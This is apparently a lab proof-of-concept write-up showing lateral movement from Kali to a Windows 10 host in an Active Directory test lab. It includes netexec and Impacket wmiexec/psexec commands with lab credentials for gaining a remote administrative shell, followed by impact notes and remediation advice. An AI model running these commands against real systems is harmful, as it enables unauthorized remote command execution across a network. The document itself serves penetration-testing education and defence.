# POC-05 – Lateral Movement: PsExec / WMIexec

**ATT&CK:** T1021.002 – Remote Services: SMB/Windows Admin Shares
**Host:** Kali → Windows 10
**Tools:** Impacket (`psexec.py`, `wmiexec.py`)

## Steps

### 1. Confirm credentials have local admin rights on the Windows 10 host
```bash
netexec smb 192.168.56.20 -u domainuser -p 'Password123'
```
Look for `(Pwn3d!)` in the output, indicating admin access.

### 2. Get a shell via WMIexec (quieter, no service install)
```bash
impacket-wmiexec lab.local/domainuser:'Password123'@192.168.56.20
```

### 3. Or via PsExec (drops a service binary, noisier but classic)
```bash
impacket-psexec lab.local/domainuser:'Password123'@192.168.56.20
```

## Observation
Record whether a SYSTEM/administrative shell was obtained, and which method worked.

## Evidence
`![Impacket wmiexec shell on Windows 10](screenshots/poc05-wmiexec-shell.png)`

## Impact
Once valid admin-equivalent credentials are available, an attacker can execute commands on any reachable domain-joined host — the core mechanic of lateral movement in AD environments.

## Remediation
Restrict local admin rights so domain users are not local admins on workstations by default (LAPS for local admin password randomization), enable SMB signing, and alert on PsExec-style service creation (Event ID 7045) and WMI process creation.
